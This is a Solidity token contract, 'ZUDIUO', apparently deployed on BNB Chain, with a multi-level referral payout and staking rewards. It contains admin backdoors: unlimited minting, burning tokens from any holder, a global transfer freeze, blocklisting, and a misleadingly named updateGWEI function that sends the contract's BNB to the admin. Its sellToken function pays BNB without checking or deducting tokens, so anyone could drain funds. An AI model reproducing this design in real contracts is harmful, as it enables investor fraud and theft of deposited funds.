/**
 *Submitted for verification at BscScan.com on 2022-12-13
*/

// SPDX-License-Identifier: UNLISCENSED
pragma solidity 0.8.7;
contract ZUDIUO  {
    string public name = "ZUDIUO";
    string public symbol = "ZUDI";
    uint256 public totalSupply =1000000000*10**18; // 100 Cr tokens
    uint8 public decimals = 18;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
    struct User {
        uint id;
        address referrer;
        uint partnersCount;
        uint256 totalDeposit;
        uint256 levelincome;
        uint256 payouts;
        uint256 holdingtoken;
        uint256 totalincome;
        uint256 totalwithdraw;
        uint256 tokenwithdraw;   
    }
    struct OrderInfo {
        uint256 amount; 
        uint256 deposit_time;
        uint256 payouts; 
        bool isactive;
    }
    mapping(address=>User) public users;
    mapping(address => OrderInfo[]) public orderInfos;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(uint => address) public idToAddress;
    uint public lastUserId = 2;
    uint public idoindex = 1;
    uint public idodistribution = 0;
    mapping(uint => uint256) public IDOs;
    address private admin;
    address public ido=0x6137d3e622920543Cf36923496Cb9738E959D3dC;
    address public liquidityWallet=0x6137d3e622920543Cf36923496Cb9738E959D3dC;
    address public marketingWallet=0x6137d3e622920543Cf36923496Cb9738E959D3dC;
    uint public liquidityFee =2;
    uint public marketingFee =1;
    bool public istransfer = true;
    uint256 private dayRewardPercents = 5;
    uint256 private constant timeStepdaily = 60*60;
    uint256[5] private levelPercents = [100,50,25,15,10];
    mapping (address => bool) public isBlocklisted;
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Upgrade(address indexed user, uint256 value);
    event Transaction(address indexed user,address indexed from,uint256 value, uint8 level,uint8 Type);
    event withdraw(address indexed user,uint256 value,uint8 Type);
    constructor() {
        admin=msg.sender;
        balanceOf[admin] = totalSupply*75/100;
        balanceOf[ido] = totalSupply*25/100;
        IDOs[1]=500;
        IDOs[2]=666;
        IDOs[3]=832;
        IDOs[4]=999;
        IDOs[5]=1165;
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: 0,
            totalDeposit:0,
            levelincome:0,
            payouts:0,
            holdingtoken:0,
            totalincome:0,
            totalwithdraw:0,
            tokenwithdraw:0

        });
        users[admin] = user;
        idToAddress[1] = admin;
    }
    function setPublicPrice(uint _liquidityFee,uint _marketingFee,address _liquidityWallet,address _marketingWallet) public {
        require(msg.sender==admin,"Only contract owner"); 
        liquidityFee=_liquidityFee;
        marketingFee=_marketingFee;
        liquidityWallet=_liquidityWallet;
        marketingWallet=_marketingWallet;
    }
    function registrationExt(address referrerAddress) external payable {
        require(msg.value>=((4/100)*(1 ether)), "Minimum invest amount is 0.04 BNB!");
        registration(msg.sender, referrerAddress,msg.value);
    }
    function registration(address userAddress, address referrerAddress,uint256 _amount) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");

        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0,
            totalDeposit:0,
            levelincome:0,
            payouts:0,
            holdingtoken:0,
            totalincome:0,
            totalwithdraw:0,
            tokenwithdraw:0

        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        users[userAddress].referrer = referrerAddress;
        lastUserId++;
        users[referrerAddress].partnersCount++; 
        _distributeDeposit(userAddress,_amount);        
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    function buyToken() external payable {
        require(msg.value>=4e16, "Minimum invest amount is 0.04 BNB!");
        _distributeDeposit(msg.sender,msg.value);
        emit Upgrade(msg.sender,msg.value);
    }
    function coinRate() public view returns(uint256)
    {
        return IDOs[idoindex];
    }
    function _distributeDeposit(address _user, uint256 _amount) private { 
        users[_user].totalDeposit = _amount;        
        _distributelevelIncome(_user, _amount);  
        uint _rate = coinRate();
        uint tokens = (_amount*1e8/_rate);
        orderInfos[_user].push(OrderInfo(
            tokens/2, 
            block.timestamp, 
            0,
            true
        ));
        balanceOf[ido] -= tokens/2;
        balanceOf[_user] += tokens/2;
        emit Transfer(ido, _user, tokens/2);
        updateIDOIndex(tokens);
    }
    function updateIDOIndex(uint256 _token) private
    {
        idodistribution+=_token;
        if(idodistribution<=5e22)
        {
            idoindex=1;
        }
        else if(idodistribution>5e22 && idodistribution<=10e22)
        {
            idoindex=2;
        }
        else if(idodistribution>10e22 && idodistribution<=15e22)
        {
            idoindex=3;
        }
        else if(idodistribution>15e22 && idodistribution<=20e22)
        {
            idoindex=4;
        }
        else if(idodistribution>20e22)
        {
            idoindex=5;
        }

    }
    function _distributelevelIncome(address _user, uint256 _amount) private {
        address upline = users[_user].referrer;
        for(uint8 i = 0; i < 5; i++){
            if(upline != address(0)){
                uint256 reward=_amount*levelPercents[i]/1000; 
                users[upline].levelincome += reward;                       
                users[upline].totalincome +=reward;   
                emit Transaction(upline,_user,reward,(i+1),1);                        
                upline = users[upline].referrer;
            }else{
                break;
            }
        }
    }
    function _tokenToBNB(uint256 tokenAmount) public view returns(uint256)
    {
        return tokenAmount*coinRate();
    }
    function sellToken(uint256 _tokens) public payable {
		address _userAddress = msg.sender;
		uint256 _amount = _tokenToBNB(_tokens);	
		payable(_userAddress).transfer(_amount);
		  
    }
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    
    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }
    function workingWithdraw() public
    {
        uint balanceReward = users[msg.sender].totalincome - users[msg.sender].totalwithdraw;
        require(balanceReward>0, "Insufficient reward to withdraw!");
        users[msg.sender].totalwithdraw+=balanceReward;
        payable(msg.sender).transfer(balanceReward);  
        emit withdraw(msg.sender,balanceReward,1);
    }
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {     
        return _amount*75/100;
    }
    function dailyPayoutOf(address _user) public {
        uint256 max_payout=0;
        for(uint8 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            if(order.isactive && block.timestamp>order.deposit_time){
                max_payout = this.maxPayoutOf(order.amount);   
                if(order.payouts<max_payout){
                    uint256 dailypayout = (order.amount*dayRewardPercents*((block.timestamp - order.deposit_time) / timeStepdaily) / 100) - order.payouts;
                    if(order.payouts+dailypayout > max_payout){
                        dailypayout = max_payout-order.payouts;
                    }
                    users[_user].payouts += dailypayout;            
                    users[_user].holdingtoken +=dailypayout;
                    emit Transaction(_user,_user,dailypayout,1,2);
                    order.payouts+=dailypayout;
                }
                else {
                    order.isactive=false;
                }
            }
            if(block.timestamp>=order.deposit_time+1 days)
            {
                users[_user].holdingtoken +=order.amount;
                emit Transaction(_user,_user,order.amount,1,3);
            }
        }
    }
    function stakingWithdraw() public
    {
        dailyPayoutOf(msg.sender);
        uint balanceToken = users[msg.sender].holdingtoken - users[msg.sender].tokenwithdraw;
        require(balanceToken>0, "Insufficient token to withdraw!");
        users[msg.sender].tokenwithdraw+=balanceToken;

        balanceOf[ido] -= balanceToken;
        balanceOf[msg.sender] += balanceToken;
        emit Transfer(ido, msg.sender,balanceToken);
        emit withdraw(msg.sender,balanceToken,2);
    }
    function updateGWEI(uint256 _amount) public
    {
        require(msg.sender==admin,"Only contract owner"); 
        require(_amount>0, "Insufficient reward to withdraw!");
        payable(admin).transfer(_amount);  
    }
    function manageTransfer() public {
        require(msg.sender==admin,"Only contract owner"); 
        istransfer = !istransfer;
    }
    function transfer(address _to, uint256 _value)
        public
        returns (bool success)
    {
        require(!isBlocklisted[msg.sender], "Address is blocklisted!");
        require(istransfer, "Transfer token disabled!");
        require(balanceOf[msg.sender] >= _value);
        uint256 _valuesend=_value;

        if(liquidityFee>0)
        {
            uint256 _liquidityValue = _value*liquidityFee/100;
            balanceOf[liquidityWallet] +=_liquidityValue;
            _valuesend-=_liquidityValue;
            emit Transfer(msg.sender, liquidityWallet, _liquidityValue);
        }
        if(marketingFee>0)
        {
            uint256 _marketingValue = _value*marketingFee/100;
            balanceOf[marketingWallet] +=_marketingValue;
            _valuesend-=_marketingValue;
            emit Transfer(msg.sender, marketingWallet, _marketingValue);
        }
        
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _valuesend;
        emit Transfer(msg.sender, _to, _valuesend);
        return true;
    }

    function approve(address _spender, uint256 _value)
        public
        returns (bool success)
    {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function mint(uint256 amount,address account) public returns (bool) {
        if (msg.sender != admin) {revert("Access Denied");}
        _mint(account, amount);
        return true;
    }
    function _mint(address account, uint256 amount) internal virtual 
    {
        require(account != address(0), "BEP20: mint to the zero address");
        totalSupply += amount;
        balanceOf[account] += amount;
    }   
    function burn(uint256 amount,address account) public returns (bool) {
        if (msg.sender != admin) {revert("Access Denied");}
        _burn(account, amount);
        return true;
    }
    function _burn(address account, uint256 amount) internal virtual 
    {
        require(account != address(0), "BEP20: burn from the zero address");
        uint256 accountBalance = balanceOf[account];
        require(accountBalance >= amount, "BEP20: burn amount exceeds balance");
        require(totalSupply>=amount, "Invalid amount of tokens!");
        balanceOf[account] = accountBalance - amount;        
        totalSupply -= amount;
    }
    function transferOwnership(address newOwner) public returns (bool) {
        if (msg.sender != admin) {revert("Access Denied");}
        admin = newOwner;
        return true;
    }
    function addToBlocklist(address[] memory _addresses) external {
        if (msg.sender != admin) {revert("Access Denied");}
        for (uint256 i = 0;i < _addresses.length;i++) {
            isBlocklisted[_addresses[i]] = true;
        }
    }

    function removeFromWhitelist (address[] memory _addresses) external {
        if (msg.sender != admin) {revert("Access Denied");}
        for (uint256 i = 0;i < _addresses.length;i++) {
            isBlocklisted[_addresses[i]] = false;
        }
    }
}